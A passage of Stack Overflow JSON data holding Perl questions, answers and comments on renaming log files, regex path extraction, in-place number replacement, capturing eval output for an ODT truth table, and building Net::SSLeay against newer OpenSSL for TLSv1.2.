"https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "edited": false, "score": 0, "creation_date": 1520519916, "post_id": 49175043, "comment_id": 85356413, "body": "grep &#39;svseed&#39; tc_1/tc1.log | awk &#39;{print $7}&#39; i want this command to use in perl script. how to do this"}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "edited": false, "score": 0, "creation_date": 1520522398, "post_id": 49176147, "comment_id": 85358322, "body": "now i changed the log file name to ncverilog.log its printing like ncver110973737 like this i want like this ncverilog_110973737"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1520522587, "post_id": 49176147, "comment_id": 85358441, "body": "Please use lexical filehandles in example code. Best to not teach beginners outdated practices."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "edited": false, "score": 0, "creation_date": 1520522723, "post_id": 49176147, "comment_id": 85358546, "body": "@abhishek: If you study and understand the code, I think it will become obvious which line you need to change. We&#39;re not here to do all of your thinking for you."}, {"owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "edited": false, "score": 0, "creation_date": 1520522846, "post_id": 49176147, "comment_id": 85358628, "body": "Thank you, i will try it"}], "tags": [], "owner": {"reputation": 1009, "user_id": 2051109, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/216009d45e1b8e34f936173142f0648f?s=128&d=identicon&r=PG", "display_name": "BOC", "link": "https://stackoverflow.com/users/2051109/boc"}, "is_accepted": true, "score": 0, "last_activity_date": 1520521199, "creation_date": 1520521199, "answer_id": 49176147, "question_id": 49175043, "link": "https://stackoverflow.com/questions/49175043/perl-script-to-change-the-file-name/49176147#49176147", "title": "Perl script to change the file name", "body": "<pre><code>my $filename = 'tc1.log';\nopen (FILE, '&lt;', $filename) or die \"Can't open $filename: $!\";\nmy $new_name = $filename;\nwhile (my $line = &lt;FILE&gt;) {\n  chomp $line;\n  if ($line =~ m/SVSEED set randomly from command line: (\\S+)/) {\n     my $seed = $1;\n     $new_name =~ s/.log/${seed}.log/;\n     last;\n  }\n}\nclose FILE;\nrename $filename, $new_name if $filename ne $new_name;\n</code></pre>\n"}], "owner": {"reputation": 17, "user_id": 8956086, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c484c38781d87ee8929257c2942d7a37?s=128&d=identicon&r=PG&f=1", "display_name": "abhi shek", "link": "https://stackoverflow.com/users/8956086/abhi-shek"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 66, "favorite_count": 0, "closed_date": 1520525643, "accepted_answer_id": 49176147, "answer_count": 1, "score": -4, "last_activity_date": 1520521199, "creation_date": 1520517936, "last_edit_date": 1520519547, "question_id": 49175043, "link": "https://stackoverflow.com/questions/49175043/perl-script-to-change-the-file-name", "closed_reason": "Needs more focus", "title": "Perl script to change the file name", "body": "<p>i have a file called tc1.log, in that file a line started with </p>\n\n<pre><code>SVSEED set randomly from command line: -729040569\n</code></pre>\n\n<p>Now i want a perl script to read the number (<code>-729040569</code>) and same time it has to append to my log file likewise <code>[tc1_-729040569.log]</code>. How to do this by using perl script.</p>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1520516216, "post_id": 49174362, "comment_id": 85353787, "body": "See <a href=\"https://ideone.com/hDfGPt\" rel=\"nofollow noreferrer\">this Perl demo</a> or <a href=\"https://ideone.com/2KzE6u\" rel=\"nofollow noreferrer\">this one</a>."}, {"owner": {"reputation": 327, "user_id": 6119979, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/10205855902905909/picture?type=large", "display_name": "Saket Khandelwal", "link": "https://stackoverflow.com/users/6119979/saket-khandelwal"}, "reply_to_user": {"reputation": 481636, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1520516862, "post_id": 49174362, "comment_id": 85354244, "body": "Thanks, this worked. I get what i did wrong now. @WiktorStribi\u017cew"}], "answers": [{"comments": [{"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "edited": false, "score": 1, "creation_date": 1520518038, "post_id": 49174519, "comment_id": 85355094, "body": "why not given the suggestion for <code>File::basename</code>. There is any particular reason champ."}], "tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 1, "last_activity_date": 1520516401, "creation_date": 1520516401, "answer_id": 49174519, "question_id": 49174362, "link": "https://stackoverflow.com/questions/49174362/perl-script-not-extracting-only-path-regex/49174519#49174519", "title": "perl script not extracting only path (regex)", "body": "<p>What do you mean by \"output\"? <code>$1</code> contains</p>\n\n<pre><code>cd-lib/mp3/rock/LittleFeat/Dixie_Chicken/\n</code></pre>\n\n<p>which is almost what you wanted (it just misses the leading <code>/</code>).</p>\n\n<p>You assigned <code>$_</code> to <code>$oldpath</code>, than matched it against a regex. It doesn't change either <code>$_</code> or <code>$oldpath</code>.</p>\n\n<p>The canonical way is</p>\n\n<pre><code>my ($match) = m/^\\/(.+\\/)*/;\n</code></pre>\n\n<p>or rather (to prevent the leaning toothpick syndrome)</p>\n\n<pre><code>my ($match) = m{^/(.+/)*};\n</code></pre>\n\n<p>i.e. running the match in list context returns the matching capture groups, and the first one is assinged to $match.</p>\n"}], "owner": {"reputation": 327, "user_id": 6119979, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/10205855902905909/picture?type=large", "display_name": "Saket Khandelwal", "link": "https://stackoverflow.com/users/6119979/saket-khandelwal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "accepted_answer_id": 49174519, "answer_count": 1, "score": 0, "last_activity_date": 1520516401, "creation_date": 1520515982, "question_id": 49174362, "link": "https://stackoverflow.com/questions/49174362/perl-script-not-extracting-only-path-regex", "title": "perl script not extracting only path (regex)", "body": "<p>I have this regex expression</p>\n\n<pre><code>($oldpath = $_) =~ m/^\\/(.+\\/)*/;\n</code></pre>\n\n<p>This is the input:</p>\n\n<pre><code>/cd-lib/mp3/rock/LittleFeat/Dixie_Chicken/110-lafayette_railroad.mp3\n</code></pre>\n\n<p>But the output is:</p>\n\n<pre><code>/cd-lib/mp3/rock/LittleFeat/Dixie_Chicken/110-lafayette_railroad.mp3\n</code></pre>\n\n<p>When it should be:</p>\n\n<pre><code>/cd-lib/mp3/rock/LittleFeat/Dixie_Chicken/\n</code></pre>\n\n<p>Thanks in advance. :)</p>\n"}, {"tags": ["bash", "shell", "perl", "csh"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 1520516251, "post_id": 49174144, "comment_id": 85353817, "body": "I have edited your code to make the formatting more consistent. You&#39;re welcome, of course, but please consider doing it yourself in the future. Careful indentation is an important tool for making your code easier to understand. If you&#39;re asking a large group of strangers to read and understand your code, it&#39;s surely polite to put some effort into making that as easy as possible for them."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 3, "creation_date": 1520516346, "post_id": 49174144, "comment_id": 85353885, "body": "Do you get any errors or output? Because on the first line, you don&#39;t actually check whether <code>y</code> opens correctly. But it&#39;s also not clear if there are any files called <code>$count</code> (which looks like it&#39;s a string, which is pretty bad style) for <code>sed</code> to work on... for that matter, why are you even using <code>sed</code> when you can do the same thing within perl?"}, {"owner": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 2, "creation_date": 1520518385, "post_id": 49174144, "comment_id": 85355326, "body": "Show the output of the script."}, {"owner": {"reputation": 39, "user_id": 9462322, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Anthonyj", "link": "https://stackoverflow.com/users/9462322/anthonyj"}, "edited": false, "score": 0, "creation_date": 1520569291, "post_id": 49174144, "comment_id": 85378491, "body": "actually i have printed contents of y file by doing print @words. its working fine ,and $count has the content of x file.Im ok with perl also ,i just tried sed . @ Sobrique"}, {"owner": {"reputation": 39, "user_id": 9462322, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Anthonyj", "link": "https://stackoverflow.com/users/9462322/anthonyj"}, "reply_to_user": {"reputation": 9406, "user_id": 4923629, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/2abZO.png?s=128&g=1", "display_name": "123", "link": "https://stackoverflow.com/users/4923629/123"}, "edited": false, "score": 0, "creation_date": 1520570307, "post_id": 49174144, "comment_id": 85378724, "body": "unterminated `s&#39; command: This is the error i got . And there is problem with $count even because its showing this errorUse of uninitialized value in concatenation (.) or string at line 21,&lt;$fh&gt; @123"}], "answers": [{"comments": [{"owner": {"reputation": 39, "user_id": 9462322, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Anthonyj", "link": "https://stackoverflow.com/users/9462322/anthonyj"}, "edited": false, "score": 0, "creation_date": 1520569908, "post_id": 49174548, "comment_id": 85378633, "body": "actually i have added use stricts and all before ,i have just attached main part of code.And yes im having error on sed line . I can add perl also in that"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 39, "user_id": 9462322, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Anthonyj", "link": "https://stackoverflow.com/users/9462322/anthonyj"}, "edited": false, "score": 0, "creation_date": 1520583261, "post_id": 49174548, "comment_id": 85383704, "body": "@Anthonyj: I&#39;m pretty sure that my point 2 will address your problem."}, {"owner": {"reputation": 39, "user_id": 9462322, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Anthonyj", "link": "https://stackoverflow.com/users/9462322/anthonyj"}, "edited": false, "score": 0, "creation_date": 1520594143, "post_id": 49174548, "comment_id": 85389843, "body": "Thanks for your help. I tried with csh foreach and its working fine now ."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 39, "user_id": 9462322, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Anthonyj", "link": "https://stackoverflow.com/users/9462322/anthonyj"}, "edited": false, "score": 0, "creation_date": 1520596023, "post_id": 49174548, "comment_id": 85390802, "body": "@Anthonyj - Or you could have just used <code>chomp()</code> as I suggested."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 0, "last_activity_date": 1520516491, "creation_date": 1520516491, "answer_id": 49174548, "question_id": 49174144, "link": "https://stackoverflow.com/questions/49174144/want-to-replace-a-number-in-many-files/49174548#49174548", "title": "want to replace a number in many files", "body": "<p>It's really not very clear what you're trying to achieve. But here are three tips which might make it easier for you track down your problem.</p>\n\n<ol>\n<li>Always add <code>use strict</code> and <code>use warnings</code> to your code. And fix the problems that they will show you.</li>\n<li>When reading data from a file, it will still have newlines at the end of each record. Use <code>chomp()</code> to remove those.</li>\n<li>Calling <code>sed</code> from a Perl program is a strange choice. There's nothing that <code>sed</code> can do that you can't do easier using Perl.</li>\n</ol>\n"}], "owner": {"reputation": 39, "user_id": 9462322, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Anthonyj", "link": "https://stackoverflow.com/users/9462322/anthonyj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 64, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1520572070, "creation_date": 1520515353, "last_edit_date": 1520572070, "question_id": 49174144, "link": "https://stackoverflow.com/questions/49174144/want-to-replace-a-number-in-many-files", "title": "want to replace a number in many files", "body": "<p>I have x file which has file names (a.txt,b.txt,c.txt....j.txt) and y file which has (1,2,3,4,....).I want to replace a constant number (which is same throught out each file) with corresponding number like in a.txt=1,b.txt=2,c.txt=3....... \nI have tried with following code</p>\n\n<pre><code>open my $handle, '&lt;', \"y\";\n@words = &lt;$handle&gt;;\nclose($handle);\n\nopen(my $fh,\"x\") or die \"Couldn't open file file.txt, $!\";\nwhile ( $count = &lt;$fh&gt;) {\n\n  print @words ;\n  print $count;\n  system(\"  sed -i 's/129/$words[$i]/g' '$count' \") ;\n\n  $i++;\n}\nclose ($fh);\n</code></pre>\n\n<p>this is not replacing anything in file.\nEdit: a.txt is file name looks like \nhey im human.\n129\nand hey im human is common to all b.txt,c.txt till j.txt.and 129 is constant number i want to replace it by 1,2,3... in coresponding file(in a.txt 1 should be there, in b.txt 2 should be there.)\nPlease share your concerns.\nThanks in advance</p>\n"}, {"tags": ["perl", "openoffice-writer", "odt"], "comments": [{"owner": {"reputation": 377, "user_id": 6583638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zobe.jpg?s=128&g=1", "display_name": "Flying_whale", "link": "https://stackoverflow.com/users/6583638/flying-whale"}, "edited": false, "score": 0, "creation_date": 1520501829, "post_id": 49168217, "comment_id": 85344704, "body": "<a href=\"http://search.cpan.org/dist/OpenOffice-OODoc/OODoc.pod\" rel=\"nofollow noreferrer\">this</a> should help you"}, {"owner": {"reputation": 5, "user_id": 9014220, "user_type": "registered", "profile_image": "https://graph.facebook.com/1154668594666218/picture?type=large", "display_name": "M\u1ea1ch \u0110i\u1ec7n T\u1eed", "link": "https://stackoverflow.com/users/9014220/m%e1%ba%a1ch-%c4%90i%e1%bb%87n-t%e1%bb%ad"}, "reply_to_user": {"reputation": 377, "user_id": 6583638, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zobe.jpg?s=128&g=1", "display_name": "Flying_whale", "link": "https://stackoverflow.com/users/6583638/flying-whale"}, "edited": false, "score": 0, "creation_date": 1520503582, "post_id": 49168217, "comment_id": 85345894, "body": "i know that link , but the problem is how to take the value of A and A_1 and the result to an @array or %hash to use them"}], "answers": [{"comments": [{"owner": {"reputation": 5, "user_id": 9014220, "user_type": "registered", "profile_image": "https://graph.facebook.com/1154668594666218/picture?type=large", "display_name": "M\u1ea1ch \u0110i\u1ec7n T\u1eed", "link": "https://stackoverflow.com/users/9014220/m%e1%ba%a1ch-%c4%90i%e1%bb%87n-t%e1%bb%ad"}, "edited": false, "score": 0, "creation_date": 1520567767, "post_id": 49176112, "comment_id": 85378157, "body": "$s = &quot;print(&quot;.join(&#39;,&quot;\\t&quot;, &#39;, map(&quot;($_?&#39;1&#39;:&#39;0&#39;)&quot;, @vars, $s)).&quot;,\\&quot;\\\\n\\&quot;)&quot;;  how to get join with out print, every time i make truth table it print on the sceen again , but i dont need result on screen"}], "tags": [], "owner": {"reputation": 10032, "user_id": 5100564, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ZZ7Z5.png?s=128&g=1", "display_name": "Jim K", "link": "https://stackoverflow.com/users/5100564/jim-k"}, "is_accepted": true, "score": 1, "last_activity_date": 1520521867, "last_edit_date": 1520521867, "creation_date": 1520521085, "answer_id": 49176112, "question_id": 49168217, "link": "https://stackoverflow.com/questions/49168217/print-truth-table-in-to-odt-file/49176112#49176112", "title": "print truth table in to odt file", "body": "<p>Get the result of <code>eval</code> with <a href=\"https://stackoverflow.com/a/4415743/5100564\">Capture::Tiny</a>, then split the string into a two-dimensional array based on <a href=\"https://stackoverflow.com/a/4226073/5100564\">https://stackoverflow.com/a/4226073/5100564</a>.</p>\n\n<pre><code>use Capture::Tiny 'capture_stdout';\n\nsub truth_table {\n    #...the rest of your code here...\n    my $stdout = capture_stdout {\n        eval $s;\n    };\n    return $stdout;\n}\n$truth_string = truth_table 'A ^ A_1';\nmy @truth_array;\nforeach my $line (split \"\\n\", $truth_string) {\n    push @truth_array, [split ' ', $line];\n}\nforeach my $line (@truth_array) {\n    foreach my $val (@$line) {\n        print $val;\n    }\n    print \"\\n\";\n}\n</code></pre>\n\n<p>For this to work, I executed the following commands based on <a href=\"https://stackoverflow.com/questions/65865/whats-the-easiest-way-to-install-a-missing-perl-module\">What&#39;s the easiest way to install a missing Perl module?</a></p>\n\n<pre><code>cpan\ninstall Capture::Tiny\n</code></pre>\n\n<p>However, I would solve this problem in LibreOffice with a Python macro instead.  <a href=\"https://extensions.libreoffice.org/extensions/apso-alternative-script-organizer-for-python\" rel=\"nofollow noreferrer\">APSO</a> makes it convenient to enter and run this code.</p>\n\n<pre><code>import uno\nfrom itertools import product\n\ndef truth_table():\n    NUM_VARS = 2  # A and B\n    columns = NUM_VARS + 1\n    rows = pow(2, NUM_VARS) + 1\n    oDoc = XSCRIPTCONTEXT.getDocument()\n    oText = oDoc.getText()\n    oCursor = oText.createTextCursorByRange(oText.getStart())\n    oTable = oDoc.createInstance(\"com.sun.star.text.TextTable\")\n    oTable.initialize(rows, columns)\n    oText.insertTextContent(oCursor, oTable, False)\n    for column, heading in enumerate((\"A\", \"B\", \"A ^ B\")):\n        oTable.getCellByPosition(column, 0).setString(heading)\n    row = 1  # the second row\n    for p in product((0, 1), repeat=NUM_VARS):\n        result = truth_function(*p)\n        for column in range(NUM_VARS):\n            oTable.getCellByPosition(column, row).setString(p[column])\n        oTable.getCellByPosition(column + 1, row).setString(result)\n        row += 1\n\ndef truth_function(x, y):\n    return pow(x, y);\n\ng_exportedScripts = truth_table,\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/BAsXK.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/BAsXK.png\" alt=\"enter image description here\"></a></p>\n\n<p>Using <code>product</code> in this way is based on <a href=\"https://stackoverflow.com/questions/29548744/creating-a-truth-table-for-any-expression-in-python\">Creating a truth table for any expression in Python</a>.</p>\n\n<p>More documentation for Python-UNO can be found at <a href=\"https://wiki.openoffice.org/wiki/Python\" rel=\"nofollow noreferrer\">https://wiki.openoffice.org/wiki/Python</a>.</p>\n"}], "owner": {"reputation": 5, "user_id": 9014220, "user_type": "registered", "profile_image": "https://graph.facebook.com/1154668594666218/picture?type=large", "display_name": "M\u1ea1ch \u0110i\u1ec7n T\u1eed", "link": "https://stackoverflow.com/users/9014220/m%e1%ba%a1ch-%c4%90i%e1%bb%87n-t%e1%bb%ad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 70, "favorite_count": 0, "accepted_answer_id": 49176112, "answer_count": 1, "score": 0, "last_activity_date": 1520521867, "creation_date": 1520496363, "question_id": 49168217, "link": "https://stackoverflow.com/questions/49168217/print-truth-table-in-to-odt-file", "title": "print truth table in to odt file", "body": "<p>i want to print truth table in to a table in an adt file, t got a program but i don know how to get vale or value to print to odt file, this program just print result on screen !</p>\n\n<pre><code>sub truth_table {\n    my $s = shift;\n    #print \"$s\\n\";\n    my  @vars;\n    for ($s =~ /([a-zA-Z_]\\w*)/g) {\n        push @vars, $_ ;\n\n    }\n    #print \"$s\\n\";\n    #print \"$_\\n\";\n    #print Dumper \\@vars;\n    #print \"\\n\", join(\"\\t\", @vars, $s), \"\\n\", '-' x 40, \"\\n\";\n    #print Dumper \\@vars;\n    @vars = map(\"\\$$_\", @vars);\n    $s =~ s/([a-zA-Z_]\\w*)/\\$$1/g;\n    $s = \"print(\".join(',\"\\t\",', map(\"($_?'1':'0')\", @vars, $s)).\",\\\"\\\\n\\\")\";\n    $s = \"for my $_ (0, 1) { $s }\" for (reverse @vars);\n    eval $s;\n}\ntruth_table 'A ^ A_1';\n</code></pre>\n"}, {"tags": ["perl", "openssl"], "comments": [{"owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "edited": false, "score": 0, "creation_date": 1520491015, "post_id": 49166769, "comment_id": 85338819, "body": "Tough luck, <a href=\"https://weblog.bulknews.net/plenv-alternative-for-perlbrew-7b5bf00a419e\" rel=\"nofollow noreferrer\">plenv/perlbrew</a> will not upgrade your openssl, and docker is available in Centos7... KVM to fire up newer centos?"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "edited": false, "score": 0, "creation_date": 1520493666, "post_id": 49166945, "comment_id": 85340049, "body": "I installed following RPMs perl-Net-SSLeay-1.30-4.fc6.x86_64.rpm, perl-Crypt-SSLeay-0.51-11.el5.x86_64.rpm, perl-Getopt-Long-2.38-1.el5.noarch.rpm and perl-IO-Socket-SSL-1.01-2.el5.noarch.rpm when I tried to manually install Net::SSLeay  I got few warnings with make: *** [SSLeay.o] Error 1 I think I like idea of installing another version of perl but its CentOS 5.x so i don&#39;t know if i can go beyond perl 5.16."}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "edited": false, "score": 0, "creation_date": 1520494028, "post_id": 49166945, "comment_id": 85340227, "body": "@goodyone: again, the default RPM link against the old OpenSSL and thus installation of these will not help. And both new and old Perl versions most likely can be installed with perlbrew on the older CentOS version. Note that you still need to specify the OpenSSL library to use if you use  a perlbrewed Perl when installing Net::SSLeay."}, {"owner": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "edited": false, "score": 0, "creation_date": 1520496068, "post_id": 49166945, "comment_id": 85341270, "body": "I installed 5.18 using perlbrew. But when do perlbrew list it only shows 5.18 but not the existing one. Do you know why it would not list 5.8.8 ? I suspect there is a bug in perlbrew"}, {"owner": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "edited": false, "score": 0, "creation_date": 1520496947, "post_id": 49166945, "comment_id": 85341701, "body": "Never mind I was able to follow <a href=\"https://stackoverflow.com/questions/25188575/switching-to-the-system-perl-using-perlbrew\" title=\"switching to the system perl using perlbrew\">stackoverflow.com/questions/25188575/&hellip;</a>."}, {"owner": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "edited": false, "score": 0, "creation_date": 1520554504, "post_id": 49166945, "comment_id": 85375068, "body": "After installing I still get 500 SSL negotiation failed. I installed OPENSSL_PREFIX=/usr/local/openssl-1.0.2n/ perl Makefile.PL  At the end of installation did receive everything passed.  IO::Socket::SSL LWP::Protocol::https"}, {"owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "reply_to_user": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "edited": false, "score": 0, "creation_date": 1520572338, "post_id": 49166945, "comment_id": 85379287, "body": "@goodyone: there can be various reasons for a failed SSL negotiation and it is impossible from the current information to find out what is the case. Please reduce your code to the bare minimum to reproduce the problem and run it with SSL debugging enabled, i.e. <code>perl -MIO::Socket::SSL=debug4 program.pl</code>. Please add both code and debug output to your question (and not a comment) or maybe even better create a new question since this is no longer about using a specific version of OpenSSL."}, {"owner": {"reputation": 13, "user_id": 8341986, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3463dbc4b8c79f9073bccd46a49114d2?s=128&d=identicon&r=PG&f=1", "display_name": "goodyone", "link": "https://stackoverflow.com/users/8341986/goodyone"}, "edited": false, "score": 0, "creation_date": 1520579988, "post_id": 49166945, "comment_id": 85382183, "body": "I am seeing connection is successful now after recompiling the Net::SSLeay with openssl 1.0.1n. I also installedl IO::Socket::SSL and LWP::Protocol::https. Somehow it is working now,  Thank you for responding and providing great help. Earlier I was getting SSL negotiation failed (SSL3 alert write:fatal:handshake failure) and now I am seeing handshake is successful (DEBUG: .../IO/Socket/SSL.pm:860: ssl handshake done DEBUG: .../IO/Socket/SSL.pm:2845: free ctx 374956800 open=374956800 DEBUG: .../IO/Socket/SSL.pm:2856: OK free ctx 374956800 )"}], "tags": [], "owner": {"reputation": 89568, "user_id": 3081018, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Z2NYm.png?s=128&g=1", "display_name": "Steffen Ullrich", "link": "https://stackoverflow.com/users/3081018/steffen-ullrich"}, "is_accepted": true, "score": 1, "last_activity_date": 1520491371, "creation_date": 1520491371, "answer_id": 49166945, "question_id": 49166769, "link": "https://stackoverflow.com/questions/49166769/using-perl-5-8-8-with-openssl-1-0-1-to-connect-with-tlsv1-2/49166945#49166945", "title": "Using perl 5.8.8 with OpenSSL 1.0.1 to connect with TLSv1.2", "body": "<blockquote>\n  <p>... use CPAN to update/install perl modules. Instead of that I got the rpm for perl modules and installed.</p>\n</blockquote>\n\n<p>I have no idea which rpm you've installed. But you need a version of the Net::SSLeay (or Crypt::SSLeay - whatever you've used) module which is linked against the 